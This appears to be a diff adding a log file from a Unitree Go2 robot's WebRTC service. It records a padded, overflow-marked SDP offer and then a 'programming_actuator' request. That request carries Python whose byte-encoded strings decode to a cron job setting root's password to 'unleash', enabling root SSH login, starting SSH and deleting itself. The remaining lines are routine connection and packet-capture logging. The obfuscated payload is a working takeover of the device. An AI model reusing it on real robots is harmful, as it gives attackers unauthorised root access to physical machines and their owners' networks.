host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715924415
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 49046 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 39487 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715924415
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
+[2024-05-17 13:40:15 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=38591
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":79355151,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 39, 114, 111, 111, 116, 58, 117, 110, 108, 101, 97, 115, 104, 39, 32, 124, 32, 99, 104, 112, 97, 115, 115, 119, 100, 32, 38, 38, 32, 115, 101, 100, 32, 45, 105, 32, 39, 115, 47, 94, 35, 42, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 46, 42, 47, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 32, 121, 101, 115, 47, 39, 32, 47, 101, 116, 99, 47, 115, 115, 104, 47, 115, 115, 104, 100, 95, 99, 111, 110, 102, 105, 103, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 101, 110, 97, 98, 108, 101, 32, 115, 115, 104, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 115, 116, 97, 114, 116, 32, 115, 115, 104, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780343295\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=79355151
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber/response.h:78]: do_response_data_take() topic=rt/api/programming_actuator/response, sendOnDataChannel msg_len=152
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: /tmp/wwan0_1715924416_captrue.pcap: No such file or directory
+[2024-05-17 13:40:16 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715924416_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 13:40:19 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 13:40:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:40:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:41:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:41:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:41:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:42:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:42:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:42:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:43:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:43:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:43:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:44:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:44:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 13:44:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
